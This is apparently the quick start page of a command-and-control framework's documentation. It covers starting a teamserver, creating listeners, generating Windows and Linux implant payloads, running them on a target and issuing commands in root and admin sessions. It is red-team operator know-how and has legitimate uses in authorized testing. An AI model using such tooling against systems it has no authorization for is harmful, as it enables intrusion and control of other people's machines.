---
title: Quick Start
description: Get a session in 5 minutes.
---

This guide gets you from zero to an active agent session.

## 1. Start the teamserver

```bash
./mugen-server --profile ops.yaotl
```

You should see:

```
[*] Teamserver listening on 0.0.0.0:40056
[*] Operators: alice
```

## 2. Connect the client

```bash
./mugen-client
```

Enter your teamserver host, port, and credentials. On successful connection the main UI opens.

## 3. Create a listener

1. Go to **View → Listeners** (or the Listeners tab)
2. Click **Add**
3. Choose **HTTP** or **HTTPS**
4. Set host, port, and URI
5. Click **Save**

## 4. Generate a payload

### Demon (Windows)

1. Go to **Attack → Payload**
2. Select **Demon** as agent type
3. Choose your listener
4. Select format: `Windows Executable`, `Windows Shellcode`, or `Windows DLL`
5. Click **Generate**

### Tengu (Linux)

1. Go to **Attack → Payload**
2. Select **Tengu** as agent type
3. Choose your listener
4. Click **Generate** - produces an ELF binary

## 5. Execute and interact

Run the payload on the target. Once it checks in, the session appears in the session table with a **● live** indicator.

Double-click the session to open an interactive console.

```
[Tengu] > id
uid=0(root) gid=0(root) groups=0(root)

[Tengu] > ls /home
alice  bob

[Demon] > whoami
CORP\alice (Admin)
```

## Next steps

- [Sessions](/operator/sessions/) - manage and annotate sessions
- [Tengu commands](/agents/tengu/) - full command reference
- [Python API](/python-api/overview/) - write your own modules
